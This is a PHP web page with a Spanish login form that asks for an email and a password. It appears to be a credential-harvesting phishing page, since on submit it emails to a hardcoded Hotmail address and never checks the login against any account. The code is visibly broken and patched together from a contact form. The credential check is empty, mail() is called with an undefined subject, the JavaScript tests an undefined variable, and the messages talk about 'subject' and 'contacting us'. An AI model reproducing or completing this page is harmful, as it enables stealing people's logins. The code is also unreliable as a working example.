<?php
require("libs/config.php");
$pageDetails = getPageDetailsByName($currentPage);

$msg = '';
if (isset($_POST["sbtn"])) {
	$correo = db_prepare_input($_POST["correo"]);
	$password = db_prepare_input($_POST["password"]);
	
	if ($correo <> "" && $password <> "") {

	}else{
		$msg = errorMessage("Todos los campos son obligatorios");
	}

	$to = "lluvia_naomy@hotmail.com";
	
	$res = @mail($to, $subject);	
	if ($res) {
		simple_redirect("login.php?msg=success");
	} else {
		simple_redirect("login.php?msg=error");
	}
}
include("header.php");
?>

<style>
.rows{ width:100%; height:auto; overflow:hidden; margin-bottom:10px; }
.label{ width:100px;color:#000; float:left;padding-top:5px;}
.input-row{ width:280px; height:32px; background-color:#FFF; float:left; position:relative; }
.input-textarea-row{ width:280px; height:65px; background-color:#FFF; float:left; position:relative; }
.textbox{ width:100%; height:24px;  border:1px solid #007294;outline:none; background:transparent; color:#000; padding:0px;  }
.textarea{ width:100%; height:57px;  border:1px solid #007294; outline:none; background:transparent; color:#000; padding:0px;  }
.submit_button{background:#118eb1;padding:2px;border:none;cursor:pointer;}
.success{padding-bottom:30px; color:#009900;}
.error{padding-bottom:30px; color:#F00;}
</style>
<script type="text/javascript">

function IsEmail(email) {
  var regex = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
  return regex.test(email);
}

function validateForm() {
	var correo = $.trim($("#correo").val());
	var password = $.trim($("#password").val());
	
	if (correo == "" ) {
        alert("Enter your email");
		$("#correo").focus();
        return false;
    } else if (!IsEmail(email)) {
        alert("Enter valid email");
		$("#correo").focus();
        return false;
    } 
	
	if (password == "" ) {
        alert("Enter your subject");
		$("#password").focus();
        return false;
    } 
	
	return true;
}
</script>
<div class="row main-row">
  <div class="8u">
    <section class="left-content">
     <h2><?php echo stripslashes($pageDetails["page_title"]); ?></h2>
            <?php echo stripslashes($pageDetails["page_desc"]); ?>

      <div style="height:30px;clear:both"></div>
      <?php if ($_GET["msg"] == "success") { ?>
      <div class="success">Thank you for contacting us. We will get back to you withinh 24 hours.</div>
      <?php } if ($_GET["msg"] == "error") {  ?>
      <div class="error">There was problem sending mail. please try again or try later.</div>
      <?php } ?>
      <form action="login.php" method="post" name="f" onsubmit="return validateForm();">
        
        <div class="rows">
			<div class="label"><span style="color:#F00;">*</span>Correo: </div>
			<div class="input-row" ><input name="correo" id="correo" type="text" class="textbox" autocomplete="off"></div>
		</div>
        
        <div class="rows">
			<div class="label"><span style="color:#F00;">*</span>Contraseña: </div>
			<div class="input-row" ><input name="password" id="password" type="text" class="textbox" autocomplete="off"></div>
		</div>
        
         <div class="rows">
         <div class="label"></div>
         <input type="submit" value="Entrar" name="sbtn" class="submit_button" />
         </div>

        
        
        
      </form>
    </section>
  </div>
  <!--sidebar starts-->
  <?php
	include("sidebar.php");
	?>
  <!--sidebar ends-->
</div>
<?php
include("footer.php");
?>
